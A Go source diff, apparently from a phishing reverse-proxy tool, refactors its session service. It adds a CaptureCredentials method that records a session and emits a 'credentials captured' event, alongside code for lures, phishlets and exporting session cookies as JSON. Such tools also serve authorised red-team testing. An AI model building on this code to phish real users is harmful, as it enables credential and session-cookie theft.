@@ -9,9 +9,9 @@ import (
 	"github.com/google/uuid"
 )
 
-// SessionStore is the persistence interface required by SessionService.
+// sessionStore is the persistence interface required by SessionService.
 // Implementations must be safe for concurrent use.
-type SessionStore interface {
+type sessionStore interface {
 	CreateSession(session *Session) error
 	GetSession(id string) (*Session, error)
 	UpdateSession(session *Session) error
@@ -159,28 +159,43 @@ type CookieExport struct {
 
 // SessionService owns all business logic for session lifecycle.
 type SessionService struct {
-	Store SessionStore
-	Bus   EventBus
+	Store sessionStore
+	Bus   eventBus
 }
 
 func (s *SessionService) Create(session *Session) error {
 	if err := s.Store.CreateSession(session); err != nil {
 		return err
 	}
-	s.Bus.Publish(Event{Type: EventSessionCreated, OccurredAt: time.Now(), Payload: session})
+
+	s.Bus.Publish(Event{Type: EventSessionCreated, Payload: session})
+
 	return nil
 }
 
-func (s *SessionService) Complete(id string) error {
-	session, err := s.Store.GetSession(id)
-	if err != nil {
-		return err
-	}
+func (s *SessionService) Complete(session *Session) error {
 	session.Complete()
+
 	if err := s.Store.UpdateSession(session); err != nil {
 		return err
 	}
-	s.Bus.Publish(Event{Type: EventSessionCompleted, OccurredAt: time.Now(), Payload: session})
+
+	s.Bus.Publish(Event{Type: EventSessionCompleted, Payload: session})
+
+	return nil
+}
+
+func (s *SessionService) Update(session *Session) error {
+	return s.Store.UpdateSession(session)
+}
+
+func (s *SessionService) CaptureCredentials(session *Session) error {
+	if err := s.Store.UpdateSession(session); err != nil {
+		return err
+	}
+
+	s.Bus.Publish(Event{Type: EventCredsCaptured, Payload: session})
+
 	return nil
 }
 
@@ -208,17 +223,22 @@ func (s *SessionService) NewSession(ctx *ProxyContext) (*Session, error) {
 		JA4Hash:    ctx.JA4Hash,
 		StartedAt:  time.Now(),
 	}
+
 	if ctx.Lure != nil {
 		sess.LureID = ctx.Lure.ID
 		sess.RedirectURL = ctx.Lure.RedirectURL
 	}
+
 	if ctx.Phishlet != nil {
 		sess.Phishlet = ctx.Phishlet.Name
 	}
+
 	if err := s.Store.CreateSession(sess); err != nil {
 		return nil, fmt.Errorf("creating session: %w", err)
 	}
+
 	s.Bus.Publish(Event{Type: EventSessionCreated, OccurredAt: time.Now(), Payload: sess})
+
 	return sess, nil
 }
 
@@ -232,5 +252,6 @@ func (s *SessionService) ExportCookiesJSON(id string) ([]byte, error) {
 	if err != nil {
 		return nil, err
 	}
+
 	return json.Marshal(session.ExportCookies())
 }
